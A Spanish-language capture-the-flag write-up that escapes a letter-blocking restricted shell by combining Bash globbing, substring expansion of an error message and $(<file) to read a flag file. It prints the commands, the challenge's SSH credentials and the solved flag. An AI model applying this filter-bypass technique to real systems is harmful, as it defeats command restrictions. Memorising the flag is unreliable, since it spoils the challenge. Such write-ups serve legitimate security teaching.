## Descripción
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.

Conexión:
```bash
ssh -p 27864 ctf-player@chatelaine.cylabacademy.net
# Contraseña: fd7746b4
```

## Solución
- Nos conectamos mediante SSH al servidor del reto:
  ```bash
  ssh -p 27864 ctf-player@chatelaine.cylabacademy.net
  ```
- Introducimos la contraseña proporcionada (`fd7746b4`).
- Al acceder al entorno interactivo recibimos el prompt `SansAlpha$ `. Si intentamos teclear cualquier comando que contenga letras alfabéticas (`[a-zA-Z]`), el shell lo intercepta y muestra:
  ```text
  SansAlpha: Unknown character detected
  ```
- **Fase 1: Reconocimiento del sistema de archivos con comodines (*globbing*)**:
  - Ejecutamos `./*/*` para expandir los archivos presentes en el directorio actual sin escribir letras:
    ```bash
    ./*/*
    ```
  - Bash expande la ruta al primer archivo coincidente e intenta ejecutarlo:
    ```text
    bash: ./blargh/flag.txt: Permission denied
    ```
  - Esto nos revela que la bandera se encuentra en `./blargh/flag.txt`, cuya ruta puede referenciarse con el patrón `./*/????.???`.

- **Fase 2: Extracción de caracteres alfabéticos**:
  - Provocamos un mensaje de error en Bash y lo almacenamos en una variable no alfabética (`_1`):
    ```bash
    _1=$( $ 2>&1 )
    ```
  - La variable `_1` almacena la cadena `bash: $: command not found`.
  - Mediante la expansión de parámetros de Bash (`${parametro:inicio:longitud}`), podemos recortar caracteres específicos:
    - `${_1:9:1}` obtiene la letra `c` (posición 9 de `bash: $: command not found`).
    - `${_1:10:1}` obtiene la letra `o` (posición 10 de `bash: $: command not found`).

- **Fase 3: Construcción de comando y lectura de la bandera**:
  - Usamos comodines combinados con las letras obtenidas para formar la ruta `/bin/echo`:
    ```bash
    /???/?${_1:9:1}?${_1:10:1}
    ```
    (que expande a `/bin/echo` ya que coincide con `/???/?c?o`).
  - Para leer el archivo sin necesidad de invocar utilidades externas como `cat`, empleamos el operador interno de Bash `$(<archivo)`:
    ```bash
    /???/?${_1:9:1}?${_1:10:1} "$(<./*/????.???)"
    ```
  - Salida devuelta por el shell:
    ```text
    return 0 academy{7h15_mu171v3r53_15_m4dn355_ed80281c}
    ```

```text
academy{7h15_mu171v3r53_15_m4dn355_ed80281c}
```

## Notas Adicionales
- **Restricción de caracteres en Bash**: En entornos restringidos (*jail shells*), el uso de comodines (`*`, `?`, `[]`) permite al evaluador del shell resolver rutas de binarios y archivos en el sistema sin necesidad de introducir sus nombres literales.
- **Redirección interna `$(<archivo)` en Bash**: Es una funcionalidad nativa de Bash equivalente a `$(cat archivo)` pero ejecutada directamente por el intérprete sin invocar un subshell ni un proceso binario externo, ideal en restricciones donde `cat` no está disponible.
- **Expansión de parámetros de subcadena (`${var:offset:length}`)**: Permite reconstruir cualquier cadena arbitraria en tiempo de ejecución extrayendo letras de variables de entorno o de mensajes de error predecibles del sistema.

## Referencias
- [Bash Reference Manual - Filename Expansion (Globbing)](https://www.gnu.org/software/bash/manual/html_node/Filename-Expansion.html)
- [Bash Reference Manual - Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
- [PayloadsAllTheThings - Command Injection Without Characters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-alphanumeric-characters)